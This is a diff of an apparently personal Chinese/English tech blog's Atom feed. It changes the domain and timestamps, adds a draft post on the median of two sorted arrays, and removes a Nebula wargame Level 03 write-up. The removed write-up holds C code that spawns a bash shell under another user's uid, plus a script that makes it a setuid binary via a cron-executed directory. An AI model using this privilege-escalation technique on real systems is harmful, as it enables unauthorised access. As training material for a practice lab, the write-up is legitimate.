@@ -2,10 +2,10 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
 
   <title><![CDATA[Han]]></title>
-  <link href="http://hanjc.me/atom.xml" rel="self"/>
-  <link href="http://hanjc.me/"/>
-  <updated>2014-07-13T01:25:56-07:00</updated>
-  <id>http://hanjc.me/</id>
+  <link href="http://zealoct.github.io/atom.xml" rel="self"/>
+  <link href="http://zealoct.github.io/"/>
+  <updated>2014-12-03T15:06:43+08:00</updated>
+  <id>http://zealoct.github.io/</id>
   <author>
     <name><![CDATA[Zealoct]]></name>
     
@@ -15,9 +15,9 @@
   
   <entry>
     <title type="html"><![CDATA[Windows 下使用 Cocos2d-x 3.x + Lua 开发基础]]></title>
-    <link href="http://hanjc.me/blog/2014/07/06/cocos2d-lua-basic/"/>
-    <updated>2014-07-06T10:59:17-07:00</updated>
-    <id>http://hanjc.me/blog/2014/07/06/cocos2d-lua-basic</id>
+    <link href="http://zealoct.github.io/blog/2014/07/07/cocos2d-lua-basic/"/>
+    <updated>2014-07-07T01:59:17+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/07/07/cocos2d-lua-basic</id>
     <content type="html"><![CDATA[<p><a href="http://cocos2d-x.org/">Cocos2d-x</a> 是国内非常成熟的 2d 游戏开发引擎了，拥有非常广大的开发者群体和活跃的社区，支持 Windows、Linux、Mac OS、iOS、Android 和 Window Phone 等各个平台，其本身是用 C++ 语言实现的，主要提供了面向 C++ 的接口，也提供了对 Lua、object-c 和 JavaScript 的支持。我们的 minigame 要基于 Cocos（为简单起见，我就把 Cocos2d-x 称为 Cocos 了） 和 Lua 实现，这有好处也有弊端，Lua 作为一门脚本语言，开发起来确实非常快捷，不过 Cocos 社区 Lua 相关的文档和资料并不如 C++ 那么完备，使得上手的难度增加，而且 Lua 本质并不是面向对象的编程语言，我们编码时的一些 OO 的思想也要需要转变。</p>
 
 <p>出于对自己记忆力的极端不信任，决定把实习期遇到的关于 Cocos + Lua 的种种问题都记录下来，希望也能成为实习的成果之一吧！</p>
@@ -49,17 +49,17 @@
 
 <p>Cocos C++ 项目根目录如下：</p>
 
-<p><img src="http://hanjc.me/images/blog/cocos-basic-cpp.png" alt="" /></p>
+<p><img src="http://zealoct.github.io/images/blog/cocos-basic-cpp.png" alt="" /></p>
 
 <p>其中 <code>/Classes</code> 文件夹是主要的代码文件夹，开发者所需要写的全部代码文件都包含在这个文件夹中，<code>/Resources</code> 则是资源文件夹，开发者的资源都存储在这个文件夹中，<code>/cocos2d</code> 文件夹则包扩了 Cocos 完整的源代码。除此之外我们看到还有大量的 <code>/proj.xxxx</code> 文件夹，这是 Cocos 为不同平台、不同编辑器生成的项目文件夹，所有这些项目均使用 <code>/Classes</code> 中的源代码和 <code>/Resources</code> 中的资源文件。</p>
 
 <p>而 Cocos Lua 项目目录如下：</p>
 
-<p><img src="http://hanjc.me/images/blog/cocos-basic-lua.png" alt="" /></p>
+<p><img src="http://zealoct.github.io/images/blog/cocos-basic-lua.png" alt="" /></p>
 
 <p>与 C++ 项目结构类似，Lua 项目所有的程序文件都在 <code>/src</code> 文件夹下，资源文件都在 <code>/res</code> 文件夹下，<code>/frameworks</code> 包含了 Cocos 的完整源代码以及各个项目文件夹， 如下图所示为 <code>/frameworks/runtime-src</code> 文件夹的结构：</p>
 
-<p><img src="http://hanjc.me/images/blog/cocos-basic-lua-runtime-src.png" alt="" /></p>
+<p><img src="http://zealoct.github.io/images/blog/cocos-basic-lua-runtime-src.png" alt="" /></p>
 
 <p>而 <code>/runtime</code> 文件夹内则包含了生成的个平台的可执行代码。</p>
 
@@ -133,9 +133,9 @@
   
   <entry>
     <title type="html"><![CDATA[暑期实习开始]]></title>
-    <link href="http://hanjc.me/blog/2014/07/05/summer-intern/"/>
-    <updated>2014-07-05T21:44:53-07:00</updated>
-    <id>http://hanjc.me/blog/2014/07/05/summer-intern</id>
+    <link href="http://zealoct.github.io/blog/2014/07/06/summer-intern/"/>
+    <updated>2014-07-06T12:44:53+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/07/06/summer-intern</id>
     <content type="html"><![CDATA[<p>记得很清楚，拿到网易暑期实习 offer 是 4 月 30 号，正好是劳动节放假前一天，当时真的是很开心，感觉实习终于有着落了，而且还是我的首选网易游戏，所以那个劳动节过的格外开心。实习从 7 月开始，6 月末收到公司邮件通知，从 6 月 29 号开始就可以去杭州报道了，这点不得不称赞网易，对实习生的待遇非常不错，公司食堂免费吃，还提供住宿，不过因为实习生较多，公司的宿舍不够用了，所以我被分在了公司附近的乐通酒店。去之前特意查了下地图，发现公司提供住宿的几家酒店里乐通是离得最近的，跟公司只隔了一个街区，走路 10 分钟妥妥儿的，这一点还是非常方便的。</p>
 
 <p>我跟几个朋友一起，乘坐 29 号的火车来杭州，出了火车站几个人做的第一件事就是去办了张杭州一卡通，可以租自行车的那种，后来证明这个举动真是太明智了，因为我跟老缪出了地铁站之后就是租量小车慢慢悠悠骑到乐通的。我们就这样，骑着租来的橘黄色的小破车，拖着的拉杆箱，慢慢悠悠的开始了暑期杭州的日子。</p>
@@ -157,10 +157,48 @@
   </entry>
   
   <entry>
+    <title type="html"><![CDATA[Median of Two Sorted Arrays]]></title>
+    <link href="http://zealoct.github.io/blog/2014/06/11/median-of-two-sorted/"/>
+    <updated>2014-06-11T14:44:23+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/06/11/median-of-two-sorted</id>
+    <content type="html"><![CDATA[<p><strong>题目</strong>：给定两个有序数组，求这两个数组合并之后的中位数，要求时间复杂度是 <strong>O(log (m+n))</strong>。</p>
+
+<p>使用归并排序的思想，很容易在 O(m+n) 的复杂度内解决该问题，但题目要求是是 O(log (m+n))，所以并不能采用简单粗暴的方法去解。观察这个复杂度公式，很容易让人联想到是否可以利用二分去解，大致思考下仿佛也是可以的：第一步先取两个数组 A 和 B 的中位数，根据他们的大小关系在两个数组中分别舍掉一半；但是顺着这个思路进行到第二步的时候就出现问题了，因为舍掉了一些数，这一步中我们<strong>需要寻找的目标不再新数组的中位数了</strong>，问题归结为<strong>给定两个有序数组，如何寻找两个数组合并之后第 k 大的数</strong>。</p>
+
+<!-- more -->
+
+
+<p>先定义一下需要用到的字母，A 和 B 是两个输入数组，均为增序，C 是把 A，B 合并之后形成的数组，依然是增序，k 是目标数字在数组 C 中的序号，需要特别声明的是，在整个算法的解释中，我均采用了从 1 开始编号的方法，因此编号为 k 的数字实际上可以认为是第 k 大的数字，也就是说数组中有 k &ndash; 1 个数字小于此数。</p>
+
+<p>算法的总体思想是这样的：在每一轮迭代中，选取数组 A 中的一部分和数组 B 中的一部分，根据一些简单的运算，分别舍掉 A 和 B 中的一些数，组成两个新的数组 A&#8217; 和 B&#8217;，计算新的 k&#8217;（因为舍掉一些数字可能导致上一轮的 k 变得更小），并进入下一轮迭代。注意到数组 A 和 B 在计算过程中会不断变得更小，出现多个版本，我用 A0 和 B0 代表最初输入的数组，用 Ai，Bi 表示经过第 i 次迭代之后 A，B 的版本，同理 k0 是最初的输入，ki 表示经过第 i 次迭代之后的 k。</p>
+
+<p>分析我们求中位数第一步的思路：假设 C 的中位数的下标是 k，也就是说<strong> A 和 B 中总计应该恰好有 k &ndash; 1 个数小于此数</strong>，取数组 A 的中位数（编号 kA）和数组 B 的中位数（编号 kB），比较 A[kA] 和 B[kB] 的大小关系，如果 A[kA] > B[kB]，我们令 A&#8217; = A[:kA + 1]，B&#8217; = B[kB + 1:]，同时 k&#8217; = k &ndash; kB，进入下一轮迭代，其关键思想是，如果 A[kA] > B[kB]，那么数组 B 中 B[kB] 以及 B[kB] 之前的所有数字都不可能会是 C 的中位数，同样 A 中 A[kA] 之后的所有数字也都不可能，保证这一结论成立<strong>最关键</strong>的条件是，kA + kB = k，也就是说，如果 B[kB] 是 C 的中位数，那么一定有 A[kA] &lt; B[kB] 且 A[kA + 1] > B[kB]，否则 A，B 中比 B[kB] 小的数的个数加起来就不是 k &ndash; 1。此外，因为 B 中舍去了 kB 个肯定在小于中位数的数字，所以最初所求第 k 大的数字在新数组 C&#8217; 中变成第 k &ndash; kB 大的数字。</p>
+
+<p>借鉴这个方法，我们可以使用如下算法：对于每一次迭代，选取 kA 和 kB，使得 kA + kB = k，然后比较 A[kA] 和 B[kB] 的大小，如果</p>
+
+<ol>
+<li>A[kA] > B[kB], 令 A&#8217; = A[:kA + 1]，B&#8217; = [kB + 1:]，k&#8217; = k &ndash; kB</li>
+<li>A[kA] &lt; B[kB]，令 A&#8217; = A[kA + 1:]，B&#8217; = [:kB + 1]，k&#8217; = k &ndash; kA</li>
+</ol>
+
+
+<p>终止条件可以有很多种，比如 k == 1 或者 A，B 任意一个长度变成 0。</p>
+
+<p>在这个算法中 kA 和 kB 的选取直接影响到执行的效率，我的思路是在理想情况下，选取的 kA 和 kB 应当满足如下条件：k / len&copy; == kA / len(A) == kB / len(B), 也就是按照 k 在 C 中所处的位置比例来选取相应的 kA 和 kB。这种取法效率还是非常高的，考虑当 A 和 B 的长度相近的时候，按照该算法每次迭代可以舍去接近一半的数字；如果两个数组长短相差悬殊，则该算法能在一次迭代中舍去某一个数组中的大多数数字。结合一些优化，可以使得此算法非常高效：</p>
+
+<ol>
+<li>在每次迭代开始之前，检查 k 和数组长度的大小关系，如果某个数组长度大于 k，则只保留概数组前 k 个数字，该优化可保证每个数组的长度都不比 k 大；</li>
+<li></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[如何写 Ubuntu 的 Framebuffer]]></title>
-    <link href="http://hanjc.me/blog/2014/05/20/ubuntu-fbvnc/"/>
-    <updated>2014-05-20T05:26:25-07:00</updated>
-    <id>http://hanjc.me/blog/2014/05/20/ubuntu-fbvnc</id>
+    <link href="http://zealoct.github.io/blog/2014/05/20/ubuntu-fbvnc/"/>
+    <updated>2014-05-20T20:26:25+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/05/20/ubuntu-fbvnc</id>
     <content type="html"><![CDATA[<p>最近有个小项目，想在 Android 上跑一个通过直接读写 framebuffer 实现的 vnc 客户端，
 所以发现了这个 <a href="https://github.com/zohead/fbvnc">fbvnc</a>， 是 github 上一个小哥儿捣鼓的，基于现有的一个同名项目开发，专为嵌入式设备使用。这个小的 vnc 客户端的不足当然有很多，比如连基本的窗口都木有，直接占用了你整个 framebuffer，不能调整分辨率，巨慢无比，卡的紧了就直接挂，但是它有一个最大的优点，就是真的非常简单，除了一些基本的 Linux 库之外没有任何第三方的依赖。</p>
 
@@ -345,9 +383,9 @@
   
   <entry>
     <title type="html"><![CDATA[简单的递归和动态规划]]></title>
-    <link href="http://hanjc.me/blog/2014/04/04/recursion-and-dp/"/>
-    <updated>2014-04-04T22:31:50-07:00</updated>
-    <id>http://hanjc.me/blog/2014/04/04/recursion-and-dp</id>
+    <link href="http://zealoct.github.io/blog/2014/04/05/recursion-and-dp/"/>
+    <updated>2014-04-05T13:31:50+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/04/05/recursion-and-dp</id>
     <content type="html"><![CDATA[<h3>题目：WordBreak</h3>
 
 <p>首先定义如下表示</p>
@@ -503,9 +541,9 @@
   
   <entry>
     <title type="html"><![CDATA[Linux 下 c 的扩展内联汇编]]></title>
-    <link href="http://hanjc.me/blog/2014/03/05/c-asm/"/>
-    <updated>2014-03-05T03:54:09-08:00</updated>
-    <id>http://hanjc.me/blog/2014/03/05/c-asm</id>
+    <link href="http://zealoct.github.io/blog/2014/03/05/c-asm/"/>
+    <updated>2014-03-05T19:54:09+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/03/05/c-asm</id>
     <content type="html"><![CDATA[<p>简单总结了一下自己看到用到的一些内联汇编的知识点，并不是一个完整的总结，以后对内联汇编有了新的了解会慢慢扩充。</p>
 
 <p>详细细节可以参考 gcc 关与扩展内联汇编的 <a href="http://gcc.gnu.org/onlinedocs/gcc/Extended-Asm.html#Extended-Asm">文档</a></p>
@@ -628,9 +666,9 @@
   
   <entry>
     <title type="html"><![CDATA[Notes on iOS Security Whitepaper]]></title>
-    <link href="http://hanjc.me/blog/2014/03/03/ios-security/"/>
-    <updated>2014-03-03T03:56:09-08:00</updated>
-    <id>http://hanjc.me/blog/2014/03/03/ios-security</id>
+    <link href="http://zealoct.github.io/blog/2014/03/03/ios-security/"/>
+    <updated>2014-03-03T19:56:09+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/03/03/ios-security</id>
     <content type="html"><![CDATA[<p>This notes is based on <em>iOS Security &ndash; February 2014</em>, origin link can be found <a href="http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf">here</a>.</p>
 
 <p>This paper gives a brief description of iOS security, including hardware security features and how iOS leverages these features.</p>
@@ -931,9 +969,9 @@ on the computer where the device is backed up. The backed-up data is <strong>re-
   
   <entry>
     <title type="html"><![CDATA[Using theme Greyshade]]></title>
-    <link href="http://hanjc.me/blog/2014/02/26/using-theme-greyshade/"/>
-    <updated>2014-02-26T22:11:32-08:00</updated>
-    <id>http://hanjc.me/blog/2014/02/26/using-theme-greyshade</id>
+    <link href="http://zealoct.github.io/blog/2014/02/27/using-theme-greyshade/"/>
+    <updated>2014-02-27T14:11:32+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/02/27/using-theme-greyshade</id>
     <content type="html"><![CDATA[<p>Sometimes ago I came across a blog <a href="http://samwize.com/">samwize</a>, who uses a slightly
 modified theme called <a href="https://github.com/shashankmehta/greyshade">Greyshade</a>, which I
 think is very beautiful, so I applied that theme immediately. Saddly this theme does
@@ -981,9 +1019,9 @@ so I need to patch my modification and merge it into the Greyshade. I would do t
   
   <entry>
     <title type="html"><![CDATA[Vim Efficiency Notes]]></title>
-    <link href="http://hanjc.me/blog/2014/02/24/vim-notes/"/>
-    <updated>2014-02-24T15:00:00-08:00</updated>
-    <id>http://hanjc.me/blog/2014/02/24/vim-notes</id>
+    <link href="http://zealoct.github.io/blog/2014/02/24/vim-notes/"/>
+    <updated>2014-02-24T15:00:00+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/02/24/vim-notes</id>
     <content type="html"><![CDATA[<p>关于Vim的一些容易被忽视、却又能提升使用体验和操作效率的操作细节。同时记录Vim中一些（我见到过的）比较实用的配置，分享的同时也给自己留个备忘吧。
 一下子总结不完整，慢慢更新。</p>
 
@@ -1052,9 +1090,9 @@ A 是在本行行尾插入，I 是在本行行首插入。</p>
   
   <entry>
     <title type="html"><![CDATA[Notes on Paxos Made Simple]]></title>
-    <link href="http://hanjc.me/blog/2014/02/12/paxos/"/>
-    <updated>2014-02-12T00:21:02-08:00</updated>
-    <id>http://hanjc.me/blog/2014/02/12/paxos</id>
+    <link href="http://zealoct.github.io/blog/2014/02/12/paxos/"/>
+    <updated>2014-02-12T16:21:02+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/02/12/paxos</id>
     <content type="html"><![CDATA[<p><a href="http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf">Origin paper link</a></p>
 
 <h3>Problem</h3>
@@ -1290,9 +1328,9 @@ proposal it has tried to issue.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 13]]></title>
-    <link href="http://hanjc.me/blog/2014/01/26/nebula-level13/"/>
-    <updated>2014-01-26T05:54:12-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/26/nebula-level13</id>
+    <link href="http://zealoct.github.io/blog/2014/01/26/nebula-level13/"/>
+    <updated>2014-01-26T21:54:12+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/26/nebula-level13</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>
@@ -1504,9 +1542,9 @@ proposal it has tried to issue.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 12]]></title>
-    <link href="http://hanjc.me/blog/2014/01/26/nebula-level12/"/>
-    <updated>2014-01-26T04:12:53-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/26/nebula-level12</id>
+    <link href="http://zealoct.github.io/blog/2014/01/26/nebula-level12/"/>
+    <updated>2014-01-26T20:12:53+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/26/nebula-level12</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>There is a backdoor process listening on port 50001.</p>
@@ -1685,9 +1723,9 @@ proposal it has tried to issue.</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 11]]></title>
-    <link href="http://hanjc.me/blog/2014/01/26/nebula-level11/"/>
-    <updated>2014-01-26T00:44:20-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/26/nebula-level11</id>
+    <link href="http://zealoct.github.io/blog/2014/01/26/nebula-level11/"/>
+    <updated>2014-01-26T16:44:20+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/26/nebula-level11</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The <em>/home/flag11/flag11</em> binary processes standard input and executes a shell command.</p>
@@ -2078,9 +2116,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 10]]></title>
-    <link href="http://hanjc.me/blog/2014/01/24/nebula-level10/"/>
-    <updated>2014-01-24T20:40:53-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/24/nebula-level10</id>
+    <link href="http://zealoct.github.io/blog/2014/01/25/nebula-level10/"/>
+    <updated>2014-01-25T12:40:53+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/25/nebula-level10</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The setuid binary at <em>/home/flag10/flag10</em> binary will upload any file given, as long as it meets the requirements of the <em>access()</em> system call.</p>
@@ -2310,9 +2348,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 09]]></title>
-    <link href="http://hanjc.me/blog/2014/01/23/nebula-level09/"/>
-    <updated>2014-01-23T19:43:40-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/23/nebula-level09</id>
+    <link href="http://zealoct.github.io/blog/2014/01/24/nebula-level09/"/>
+    <updated>2014-01-24T11:43:40+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/24/nebula-level09</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>There&rsquo;s a C setuid wrapper for some vulnerable PHP code&hellip;</p>
@@ -2387,7 +2425,7 @@ and the output is</p>
 
 <ul>
 <li>read the content of file $argv[1]</li>
-<li>replace all the text paterns liket &ldquo;[email <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#104;&#x6a;&#99;&#64;&#104;&#97;&#110;&#106;&#x63;&#46;&#x6d;&#101;">&#x68;&#106;&#x63;&#64;&#104;&#97;&#x6e;&#x6a;&#x63;&#46;&#109;&#101;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
+<li>replace all the text paterns liket &ldquo;[email <a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#104;&#x6a;&#x63;&#64;&#x68;&#97;&#x6e;&#106;&#x63;&#46;&#x6d;&#x65;">&#104;&#x6a;&#x63;&#x40;&#x68;&#97;&#110;&#106;&#x63;&#x2e;&#x6d;&#x65;</a>]&rdquo; with &ldquo;hjc AT hanjc dot me&rdquo;</li>
 <li>replace all the &ldquo;[&rdquo; with &ldquo;&lt;&rdquo;, replace &ldquo;]&rdquo; with &ldquo;>&rdquo;</li>
 </ul>
 
@@ -2431,9 +2469,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 08]]></title>
-    <link href="http://hanjc.me/blog/2014/01/23/nebula-level08/"/>
-    <updated>2014-01-23T19:43:31-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/23/nebula-level08</id>
+    <link href="http://zealoct.github.io/blog/2014/01/24/nebula-level08/"/>
+    <updated>2014-01-24T11:43:31+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/24/nebula-level08</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>
@@ -2458,9 +2496,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 07]]></title>
-    <link href="http://hanjc.me/blog/2014/01/12/nebula-level07/"/>
-    <updated>2014-01-12T23:49:10-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/12/nebula-level07</id>
+    <link href="http://zealoct.github.io/blog/2014/01/13/nebula-level07/"/>
+    <updated>2014-01-13T15:49:10+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/13/nebula-level07</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
@@ -2539,9 +2577,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 06]]></title>
-    <link href="http://hanjc.me/blog/2014/01/12/nebula-level06/"/>
-    <updated>2014-01-12T23:48:33-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/12/nebula-level06</id>
+    <link href="http://zealoct.github.io/blog/2014/01/13/nebula-level06/"/>
+    <updated>2014-01-13T15:48:33+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/13/nebula-level06</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>The <em>flag06</em> account credentials came from a legacy unix system.</p>
@@ -2564,9 +2602,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 05]]></title>
-    <link href="http://hanjc.me/blog/2014/01/12/nebula-level05/"/>
-    <updated>2014-01-12T22:16:44-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/12/nebula-level05</id>
+    <link href="http://zealoct.github.io/blog/2014/01/13/nebula-level05/"/>
+    <updated>2014-01-13T14:16:44+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/13/nebula-level05</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>Check the <em>flag05</em> home directory. You are looking for weak directory permissions</p>
@@ -2656,9 +2694,9 @@ and the output is</p>
   
   <entry>
     <title type="html"><![CDATA[Exploit Exercises - Nebula Level 04]]></title>
-    <link href="http://hanjc.me/blog/2014/01/10/nebula-level04/"/>
-    <updated>2014-01-10T04:43:48-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/10/nebula-level04</id>
+    <link href="http://zealoct.github.io/blog/2014/01/10/nebula-level04/"/>
+    <updated>2014-01-10T20:43:48+08:00</updated>
+    <id>http://zealoct.github.io/blog/2014/01/10/nebula-level04</id>
     <content type="html"><![CDATA[<h3>About</h3>
 
 <p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
@@ -2762,115 +2800,6 @@ and the output is</p>
 
 
 <p>And it works!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 03]]></title>
-    <link href="http://hanjc.me/blog/2014/01/09/nebula-level03/"/>
-    <updated>2014-01-09T01:03:25-08:00</updated>
-    <id>http://hanjc.me/blog/2014/01/09/nebula-level03</id>
-    <content type="html"><![CDATA[<h3>About</h3>
-
-<p>Check the home directory of flag03 and take note of the files there.</p>
-
-<p>There is a crontab that is called every couple of minutes.</p>
-
-<p>To do this level, log in as the level03 account with the password level03 . Files for this level can be found in /home/flag03.</p>
-
-<!-- more -->
-
-
-<h3>Solution</h3>
-
-<p>No source code is available for this level, but there is a shell script in the home directory of user flag03</p>
-
-<figure class='code'><figcaption><span>writable.sh</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="c">#!/bin/sh</span>
-</span><span class='line'><span class="k">for </span>i in /home/flag03/writable.d/* ; <span class="k">do</span>
-</span><span class='line'>  <span class="o">(</span><span class="nb">ulimit</span> -t 5; bash -x <span class="s2">&quot;$i&quot;</span><span class="o">)</span>
-</span><span class='line'>  rm -f <span class="s2">&quot;$i&quot;</span>
-</span><span class='line'><span class="k">done</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>This script would be executed periodly by cron, after I have finished this level, I logged in with the admin account and get the content of the corresponding crontab file</p>
-
-<figure class='code'><figcaption><span>/var/spool/cron/crontabs/flag03</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>*/3 * * * * /home/flag03/writable.sh
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>For the meaning of this crontab file, please refer to the <a href="https://wiki.archlinux.org/index.php/cron">Cron Wiki</a> of Archlinux.</p>
-
-<p>Back to the script located in <em>/home/flag03</em>, this script does the following things</p>
-
-<ol>
-<li>limits the use cpu time to be 5s</li>
-<li>iterately executes all the executable files in directory <em>/home/flag03/writable.d/</em></li>
-<li>delete these executables after executing</li>
-</ol>
-
-
-<p>This crontab runs in user <em>flag03</em>, we could leverage it to do something interesting, like changing the home directory of user <em>flag03</em> to be public readable and writable, but what we need is beyond this.</p>
-
-<p>It is easy to find a way to get the privilege of user <em>flag03</em> after all we have read in the previous exercises. So I wrote the following code in C</p>
-
-<figure class='code'><figcaption><span>flag03.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="mi">996</span><span class="p">,</span> <span class="mi">996</span><span class="p">,</span> <span class="mi">996</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p>The uid 996 is got by reading <em>/etc/passwd</em></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">flag03:</span><span class="n">x</span><span class="o">:</span><span class="mi">996</span><span class="o">:</span><span class="mi">996</span><span class="o">::/</span><span class="n">home</span><span class="o">/</span><span class="n">flag03</span><span class="o">:/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>What I need now is to make user <em>flag03</em> compile this C code into an executable that could be run by <em>level04</em> and the set-user-ID bit is set. So I wrote the following script</p>
-
-<figure class='code'><figcaption><span>compile</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>gcc -o /home/flag03/flag03 /home/level03/flag03.c
-</span><span class='line'>chmod 777 /home/flag03/flag03
-</span><span class='line'>chmod +s /home/flag03/flag03
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>To make the file <em>/home/level03/flag03.c</em> readable by user flag03, I changed the permission of my home directory</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>chmod a+rx /home/level03
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now, place the compile script into <em>/home/flag03/writable.d&#8221;, and wait patiently for the execution of crontab. After this script is called, I got an executable in </em>/home/flag03<em> to help me get the privilege of user </em>flag03* :)</p>
 ]]></content>
   </entry>
   
